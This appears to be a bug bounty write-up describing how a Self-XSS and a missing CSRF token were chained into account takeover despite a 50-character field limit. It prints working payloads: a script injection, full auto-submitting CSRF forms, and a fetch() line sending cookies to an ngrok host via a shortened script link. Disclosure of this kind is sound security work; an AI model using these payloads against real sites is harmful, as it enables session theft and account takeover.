# Self-XSS + CSRF Leading to Account Takeover (50-Character Payload Limit Challenge)

- **Source URL:** https://canitey.medium.com/self-xss-csrf-leading-to-account-takeover-50-character-payload-limit-challenge-74f75d0b2c06?source=rss------bug_bounty-5
- **Fetched from:** https://canitey.medium.com/feed
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 13424)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hey everyone, it’s been a while — Canitey here again.

Today I’m sharing an interesting chain: **Self-XSS + CSRF** that results in full **account takeover**, with one tricky constraint — the vulnerable field only accepted a maximum of **50 characters**.

### Recon & Initial Findings

While testing the target, I noticed two promising things:

- The application is **server-side rendered** (a classic hint for potential XSS).
- Session cookies did **not** have the HttpOnly flag set, meaning they were accessible via JavaScript.

This immediately made me hunt for XSS that could lead to account takeover.

I quickly found a vulnerable input field that reflected my input without proper sanitization.

A simple payload like u">\<script>alert(1)\</script> worked and popped an alert.

However, two major problems stood in the way:

1. It was a **Self-XSS** — the payload only executed in *my own* context.
2. The input field had a hard **50-character limit**.

### Turning Self-XSS into Stored XSS via CSRF

To solve the first issue, I tested for **CSRF** on the form that saves the report list name. There was no CSRF protection (no token, no SameSite=Strict, etc.).

Here’s the basic CSRF PoC that successfully stored the XSS payload for my own account:

\<html>

\<body>

\<form action="https://target.com/reports/nfl/customReportList.asp" method="post">

\<input type="hidden" name="txtListName" value='u">\<script>alert(1)\</script>'>

\<input type="hidden" name="optListId" value="3">

\<input type="hidden" name="selCat" value="0">

\<input type="hidden" name="new\_reports" value="0,2000104,2000116">

\<input type="hidden" name="save\_reports" value="true">

\</form>

\<script>

document.forms\[0\].submit();

\</script>

\</body>

\</html>

This confirmed I could force the server to store arbitrary content in the txtListName field.

### Bypassing the 50-Character Limit

Now came the hard part — the 50-character restriction.

After some brainstorming, I came up with a creative bypass using **URL shorteners** and external hosting:

1. I created a JavaScript file on GitHub containing the real payload:

`fetch("//ec5854207f4f.ngrok-free.app/?cookies=" + document.cookie);`
1. I shortened the raw GitHub file URL using **bit.ly**.
2. I used the short link inside a \<script src> tag.

The final stored payload (which fits comfortably under 50 characters) became:

u">\<script src=https://bit.ly/hkd>\</script>

And here’s the complete CSRF exploit that delivers the attack to the victim:

\<html>

\<body>

\<form action="https://target.com/reports/nfl/customReportList.asp" method="post">

\<input type="hidden" name="txtListName" value='u">\<script src=https://bit.ly/hkd>\</script>'>

\<input type="hidden" name="optListId" value="3">

\<input type="hidden" name="selCat" value="0">

\<input type="hidden" name="new\_reports" value="0,2000104,2000116">

\<input type="hidden" name="save\_reports" value="true">

\</form>

\<script>

document.forms\[0\].submit();

\</script>

\</body>

\</html>

When the victim visits the malicious link (or if you can trick them into loading it), the form is auto-submitted, the short link is stored, and the external script executes in their session — exfiltrating their cookies via ngrok.

**Voila** — full account takeover.

\*Sorry for the lack of images in this report, target wanted to keep its secrecy\*
